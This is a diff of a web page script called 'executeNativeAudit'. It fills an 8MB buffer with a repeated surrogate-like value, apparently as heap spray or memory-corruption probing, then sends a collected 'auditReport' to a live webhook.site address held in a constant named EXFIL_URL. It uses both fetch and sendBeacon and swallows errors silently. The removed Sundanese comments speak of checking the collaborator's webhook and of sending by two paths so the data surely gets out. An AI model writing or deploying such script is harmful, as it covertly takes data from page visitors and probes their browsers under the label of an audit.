@@ -11,16 +11,15 @@
 
     <script>
         async function executeNativeAudit() {
-            // PASTIKEUN URL WEBHOOK ENYAR MANG FIRMAN DI HANDAP IEU LERES
             const EXFIL_URL = 'https://webhook.site/9326deec-1e36-4aa3-8945-3efe41a641e5';
             const statusNode = document.getElementById('status');
 
             try {
-                const ALLOC_SIZE = 0x800000; 
+                const ALLOC_SIZE = 0x800000; // 8MB
                 const buffer = new ArrayBuffer(ALLOC_SIZE);
                 const view = new Uint32Array(buffer);
                 
-                // PERHATOSAN: i++ sanes i--
+                // IEU NU LERES: i++ (Sanes i--)
                 for (let i = 0; i < view.length; i++) {
                     view[i] = 0xD800DBFF; 
                 }
@@ -44,7 +43,7 @@
 
                 const payloadString = JSON.stringify(auditReport);
 
-                // Jalur A & B sakaligus sangkan pasti tembus
+                // Kirim data
                 fetch(EXFIL_URL, { method: 'POST', mode: 'no-cors', body: payloadString }).catch(()=>{});
                 navigator.sendBeacon(EXFIL_URL, payloadString);
 
